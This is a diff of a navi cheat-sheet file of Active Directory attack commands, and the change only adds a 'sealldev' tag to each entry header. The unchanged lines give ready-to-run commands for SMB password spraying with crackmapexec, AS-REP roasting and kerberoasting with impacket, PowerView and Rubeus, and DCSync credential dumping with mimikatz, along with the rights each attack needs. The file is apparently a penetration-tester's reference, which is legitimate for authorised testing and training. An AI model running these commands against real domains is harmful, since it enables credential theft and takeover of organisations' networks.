@@ -1,4 +1,4 @@
-% crackmapexec, ad auth attacks, password attacks
+% sealldev, crackmapexec, ad auth attacks, password attacks
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -6,7 +6,7 @@
 # SMB password spray attack against AD host using crackmapexec
 crackmapexec smb <host_address> -u <username_or_userlist> -p '<password>' -d <domain> --continue-on-success
 
-% impacket, ad auth attacks, as-rep roasting
+% sealldev, impacket, ad auth attacks, as-rep roasting
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -14,7 +14,7 @@ crackmapexec smb <host_address> -u <username_or_userlist> -p '<password>' -d <do
 # Find users who have kerberos preauth disabled using impacket-GetNPUsers
 impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domain>/<username>
 
-% powerview, ad auth attacks, as-rep roasting
+% sealldev, powerview, ad auth attacks, as-rep roasting
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -22,7 +22,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domai
 # Find users who have kerberos preauth disabled using PowerView
 Get-DomainUser -PreauthNotRequired
 
-% rubeus, ad auth attacks, kerberoasting
+% sealldev, rubeus, ad auth attacks, kerberoasting
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -30,7 +30,7 @@ Get-DomainUser -PreauthNotRequired
 # Get hashes for SPNs using Rubeus (run from authenticated session)
 .\Rubeus.exe kerberoast /outfile:<OUTFILE>
 
-% impacket, ad auth attacks, kerberoasting
+% sealldev, impacket, ad auth attacks, kerberoasting
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -38,7 +38,7 @@ Get-DomainUser -PreauthNotRequired
 # Get hashes for SPNs using impacket
 sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
 
-% dcsync
+% sealldev, dcsync
 ; dcsync
 ; to perform a dcsync attack, the executing user needs to have the following rights:
 ;  • Replicating Directory Changes
@@ -49,7 +49,7 @@ sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
 ;  • Enterprise Admins
 ;  • Administrators
 
-% mimikatz, ad auth attacks, dcsync
+% sealldev, mimikatz, ad auth attacks, dcsync
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
@@ -58,7 +58,7 @@ sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
 ; to perform dcsync attack with mimikatz you will need the SeDebugPrivilege permission on top of the ones listed above
 lsadump::dcsync /user:<domain>/<username>
 
-% impacket, ad auth attacks, dcsync
+% sealldev, impacket, ad auth attacks, dcsync
 @ windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
